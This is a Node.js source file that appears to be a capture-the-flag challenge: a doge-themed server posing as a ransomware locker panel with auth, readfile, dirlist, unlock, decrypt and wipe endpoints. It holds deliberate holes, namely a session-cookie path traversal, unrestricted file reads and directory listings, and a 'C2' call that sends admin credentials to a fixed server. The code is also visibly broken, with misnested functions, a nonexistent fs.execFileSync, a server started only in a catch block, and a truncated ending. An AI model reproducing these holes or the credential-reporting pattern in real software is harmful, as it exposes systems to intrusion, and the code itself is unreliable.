var http = require('http');
var fs = require('fs');
var path = require('path');
var util = require('util');
var url = require('url');
var DSON = require('dogeon');
var crypto = require('crypto');
var MAIN_DOGE_SERVER = '192.168.178.86';
var AuthStore = '/tmp/sessions/';
var ENCRYPTER_MODULE = 'encrypt.exe';
var UNLOCK_FILE = 'C:\\Windows\\flag.txt';
var ADMIN = 'DOGE';
var ADMIN_PASSWORD = crypto.randomBytes(20)
    .toString('hex');
DSON.parse('such wow');
DSON.stringify({});
function parseCookies(request) {
    var list = {};
    var rc = request.headers.cookie;
    rc && rc.split(';').forEach(function (cookie) {
        var parts = cookie.split('=');
        list[parts.shift().trim()] = decodeURI(parts.join('='));
    });
    return list;
}
function checkAuth(request) {
    var rc = request.headers.cookie;
    if (!rc) {
        return false;
    }
    var cookies = rc.split(';');
    for (const cookie of cookies) {
        var parts = cookie.split('=');
        if (parts.shift().trim() === 'session') {
            var session = decodeURI(parts.join('='))
                console.log('Session: ' + session);
            var sessionPath = path.join(AuthStore, session)
                console.log('Path: ' + sessionPath);
            if (fs.existsSync(sessionPath)) {
                console.log('File exists.');
                return true;
            }
        }
    }
    return false;
}
function checkContentType(request) {
    var ct = request.headers['content-type'];
    if (ct === 'application/dson') {
        return true;
    }
    return false;
}
function checkContentLength(request) {
    var cl = request.headers['content-length'];
    if (parseInt(cl) > 0) {
        return true;
    }
    return false;
}
function createSession(user, ip) {
    var rand = Math.floor(Math.random() * 32000);
    var sessionbfr = Buffer.from(`${user}/${ip}/${rand}`);
    var b64_session = sessionbfr.toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_');
    var content = JSON.stringify({
        'user': user,
        'ip': ip
    });
    fs.writeFileSync(path.join(AuthStore, b64_session), content);
    return b64_session;
}
function getUserSession(session) {
    try {
        var sessionbfr = Buffer.from(session.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
        var sessionstr = sessionbfr.toString('utf8');
    } catch (err) {
        console.error(`Failed\x20to\x20get\x20user:\x20${err}`);
        return null;
    }
    var parts = sessionstr.split('/');
    if (parts.length != 3) {
        return null;
    }
    return parts[0];
}
function checkPassword(user, password) {
    if (user === ADMIN && password === ADMIN_PASSWORD) {
        return true;
    }
    return false;
}
function chal_unlock() {
    try {
        var istrue = fs.existsSync(UNLOCK_FILE);
        if (istrue) {
            var key = fs.readFileSync(UNLOCK_FILE);
            var hash = crypto.createHash('sha256')
                .update(key)
                .digest('base64');
            return hash;
        }
    } catch (err) {
        return false;
    }
    return true;
}
function try_unlock(answer) {
    try {
        var istrue = fs.existsSync(UNLOCK_FILE);
        if (istrue) {
            var key = fs.readFileSync(UNLOCK_FILE);
            if (key === answer) {
                return unlockui();
            }
        }
    } catch (err) {
        return false;
    }
    return false;
}
function wipe() {
    return false;
}
function unlockui() {
    return true;
}
function decrypt(key) {
    try {
        var result = fs.execFileSync(ENCRYPTER_MODULE, '-d', key);
        return result;
    } catch (err) {
        return false;
    }
    function routeRequest(request, body, response) {
        var request_url = url.parse(request.url, true);
        var authorized = checkAuth(request);
        var cookies = parseCookies(request);
        console.log('Request URL: ' + request.url);
        console.log('Request Method: ' + request.method);
        console.log('PATH:' + request_url.pathname + ' Query: ' + JSON.stringify(request_url.query));
        switch (request_url.pathname) {
        case '/auth':
            switch (request.method) {
            case 'GET':
                let user = getUserSession(cookies['session']);
                if (user === null || authorized === false) {
                    response.writeHead(403, {
                        'Content-Type': 'text/plain'
                    });
                    response.end(`Session\x20not\x20authorized:\x20${authorized}\x20for\x20user:\x20${user}\n`);
                    return;
                }
                if (user != null && authorized) {
                    response.writeHead(200, {
                        'Content-Type': 'text/plain'
                    });
                    response.end(`Session\x20is\x20authorized:\x20${authorized}\x20for\x20user:\x20${user}\n`);
                    return;
                }
                return;
                break;
            case 'POST':
                if (checkContentType(request) && checkContentLength(request)) {
                    try {
                        var recvObj = DSON.parse(body);
                    } catch (err) {
                        console.error(`Could\x20not\x20parse\x20DSON:\x20${err}`);
                        response.writeHead(400, {
                            'Content-Type': 'text/plain'
                        });
                        response.end(`Could\x20not\x20parse\x20DSON:\x20${err}\n`);
                        return;
                    }
                    let user = recvObj['user'];
                    let password = recvObj['password'];
                    if (checkPassword(user, password)) {
                        let sessionid = createSession(user, request.socket.remoteAddress);
                        response.writeHead(200, {
                            'Set-Cookie': `session=${sessionid}`,
                            'Content-Type': 'application/dson'
                        });
                        response.end('Hello\x20doge.\n');
                    } else {
                        response.writeHead(403, {
                            'Set-Cookie': 'session=',
                            'Content-Type': 'application/dson'
                        });
                        response.end('Unauthorized.\n');
                        return;
                    }
                } else {
                    response.writeHead(400, {
                        'Content-Type': 'text/plain'
                    });
                    response.end('Request no good for shibe.\n');
                    return;
                }
                break;
            default:
                console.log('Not Implemented');
                response.writeHead(400, {
                    'Content-Type': 'text/plain'
                });
                response.end('Request no good for shibe.\n');
                break;
            }
            break;
        case '/readfile':
            console.log('Read file request');
            switch (request.method) {
            case 'GET':
                let user = getUserSession(cookies['session']);
                if (user == null || authorized == false) {
                    response.writeHead(403, {
                        'Content-Type': 'text/plain'
                    });
                    response.end(`Not\x20authorized.\n`);
                    return;
                }
                if (user != null && authorized) {
                    if (request_url.query != null && Object.hasOwnProperty.call(request_url.query, 'filename')) {
                        let filename = request_url.query['filename'];
                        if (fs.existsSync(filename)) {
                            try {
                                let file_content = fs.readFileSync(filename);
                                response.writeHead(200, {
                                    'Content-Type': 'application/octet-stream'
                                });
                                response.end(file_content);
                            } catch (err) {
                                response.writeHead(500, {
                                    'Content-Type': 'text/plain'
                                });
                                response.end(`Sad\x20could\x20not\x20read\x20file\x20wow:\x20${err}\n`);
                            }
                        } else {
                            response.writeHead(404, {
                                'Content-Type': 'text/plain'
                            });
                            response.end('File not found. very sad.\n');
                        }
                        return;
                    }
                    var resp_obj = {
                        'Directory': __dirname,
                        'Listing': []
                    };
                    try {
                        var directory_list = fs.readdirSync(__dirname);
                        resp_obj['Listing'] = directory_list;
                    } catch (err) {
                        resp_obj['error'] = err;
                    }
                    response.writeHead(200, {
                        'Content-Type': 'application/dson'
                    });
                    response.end(DSON.stringify(resp_obj));
                    return;
                }
                break;
            default:
                console.log('Not Implemented');
                response.writeHead(400, {
                    'Content-Type': 'text/plain'
                });
                response.end('no good. sad method.\n');
                break;
            }
            break;
        case '/dirlist':
            console.log('Dir list request');
            switch (request.method) {
            case 'GET':
                let user = getUserSession(cookies['session']);
                if (user == null || authorized == false) {
                    response.writeHead(403, {
                        'Content-Type': 'text/plain'
                    });
                    response.end(`Not\x20authorized.\n`);
                    return;
                }
                if (user != null && authorized) {
                    var dirname = __dirname;
                    if (Object.hasOwnProperty.call(request_url.query, 'dir')) {
                        dirname = request_url.query['dir']
                    }
                    var resp_obj = {
                        'Directory': dirname,
                        'Listing': []
                    };
                    if (fs.existsSync(dirname)) {
                        try {
                            let directory_list = fs.readdirSync(dirname);
                            resp_obj['Listing'] = directory_list
                        } catch (err) {
                            resp_obj['error'] = err;
                        }
                    } else {
                        response.writeHead(404, {
                            'Content-Type': 'text/plain'
                        });
                        response.end('Dir not found. very sad.\n');
                        return;
                    }
                    response.writeHead(200, {
                        'Content-Type': 'application/dson'
                    });
                    response.end(DSON.stringify(resp_obj));
                    return;
                }
                break;
            default:
                console.log('Not Implemented');
                response.writeHead(400, {
                    'Content-Type': 'text/plain'
                });
                response.end('wow such empty. sad method.\n');
                break;
            }
            break;
        case '/unlock':
            console.log('unlock requested');
            switch (request.method) {
            case 'GET':
                let user = getUserSession(cookies['session']);
                if (user == null || authorized == false) {
                    response.writeHead(403, {
                        'Content-Type': 'text/plain'
                    });
                    response.end(`Not\x20authorized.\n`);
                    return;
                }
                if (user != null && authorized) {
                    console.log('Unlock\x20of\x20device\x20requested.');
                    var answer = '';
                    var result = false;
                    if (Object.hasOwnProperty.call(request_url.query, 'answer')) {
                        answer = request_url.query['answer']
                            result = try_unlock(answer);
                    } else {
                        result = chal_unlock();
                    }
                    resp_obj = {
                        'unlock': result,
                        'date': new Date().toString()
                    };
                    response.writeHead(200, {
                        'Content-Type': 'application/dson'
                    });
                    response.end(DSON.stringify(resp_obj));
                    return;
                }
                break;
            default:
                console.log('Not Implemented');
                response.writeHead(400, {
                    'Content-Type': 'text/plain'
                });
                response.end('wow such empty. sad method.\n');
                break;
            }
            break;
        case '/decrypt':
            console.log('unlock requested');
            switch (request.method) {
            case 'GET':
                let user = getUserSession(cookies['session']);
                if (user == null || authorized == false) {
                    response.writeHead(403, {
                        'Content-Type': 'text/plain'
                    });
                    response.end(`Not\x20authorized.\n`);
                    return;
                }
                if (user != null && authorized) {
                    if (Object.hasOwnProperty.call(request_url.query, 'key')) {
                        let key = request_url.query['key'];
                        if (key.length > 10) {
                            try {
                                var result = decrypt(key);
                            } catch (err) {
                                var result = err;
                            }
                            resp_obj = {
                                'decrypt': result,
                                'date': new Date().toString()
                            };
                            response.writeHead(200, {
                                'Content-Type': 'application/dson'
                            });
                            response.end(DSON.stringify(resp_obj));
                            return;
                        } else {
                            response.writeHead(500, {
                                'Content-Type': 'text/plain'
                            });
                            response.end('Key. very sad.\n');
                            return;
                        }
                    } else {
                        response.writeHead(500, {
                            'Content-Type': 'text/plain'
                        });
                        response.end('no key.\x20require\x20key.\n');
                        return;
                    }
                }
                break;
            default:
                console.log('Not Implemented');
                response.writeHead(400, {
                    'Content-Type': 'text/plain'
                });
                response.end('wow such empty. sad method.\n');
                break;
            }
            break;
        case '/wipe':
            console.log('remove locker requested');
            switch (request.method) {
            case 'GET':
                let user = getUserSession(cookies['session']);
                if (user == null || authorized == false) {
                    response.writeHead(403, {
                        'Content-Type': 'text/plain'
                    });
                    response.end(`Not\x20authorized.\n`);
                    return;
                }
                if (user != null && authorized) {
                    console.log('Removing\x20ransom.');
                    let result = wipe();
                    var resp_obj = {
                        'wipe': result,
                        'date': new Date().toString()
                    };
                    response.writeHead(200, {
                        'Content-Type': 'application/dson'
                    });
                    response.end(DSON.stringify(resp_obj));
                    return;
                }
                break;
            default:
                console.log('Not Implemented');
                response.writeHead(400, {
                    'Content-Type': 'text/plain'
                });
                response.end('wow such empty. sad method.\n');
                break;
            }
            break;
        case '/logout':
            console.log('Logout request.');
            let sessionid = cookies['session'];
            let user = getUserSession(cookies['session']);
            if (user == null || authorized == false) {
                response.writeHead(403, {
                    'Content-Type': 'text/plain'
                });
                response.end(`Not\x20authorized.\n`);
                return;
            }
            response.writeHead(200, {
                'Set-Cookie': `session=;\x20path=/;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT`,
                'Content-Type': 'text/plain'
            });
            response.end(`Logged\x20out\x20${user}.\x20Successful.`);
            break;
        default:
            console.log('Nothing here.');
            response.writeHead(404, {
                'Content-Type': 'text/plain'
            });
            response.end('Nothing here.\n');
            break;
        }
        if (!fs.existsSync(AuthStore)) {
            fs.mkdirSync(AuthStore, {
                recursive: true
            });
            console.log(`Created\x20new\x20Admin:\x20${ADMIN}:${ADMIN_PASSWORD}`);
            console.log('Reporting to main doge...');
            try {
                var options = {
                    hostname: MAIN_DOGE_SERVER,
                    port: 8080,
                    path: `/register?user=${ADMIN}&password=${ADMIN_PASSWORD}`,
                    method: 'GET',
                    timeout: 6000
                };
                var req = http.request(options, res => {
                    console.log(`Registering\x20at\x20C2\x20status:\x20${res.statusCode}`);
                    res.on('data', d => {
                        console.log(`Main\x20doge\x20response:\x20${d}`);
                    })
                })
                    req.on('timeout', () => {
                        req.destroy();
                    })
                    req.on('error', error => {
                        console.log(`Main\x20doge\x20did\x20not\x20respond:\x20${error}`);
                    })
            } catch (err) {
                console.log(`Failed\x20to\x20report\x20to\x20main\x20doge:\x20${err}`);
                req.destroy();
                http.createServer(function (request, response) {
                    let body = [];
                    request.on('error', (err) => {
                        console.error(`Error:\x20${err}`);
                    }).on('data', (chunk) => {
                        body.push(chunk);
                    }).on('end', () => {
                        body = Buffer.concat(body)
                            .toString();
                        routeRequest(request, body, response);
                    });
                }).listen(8124);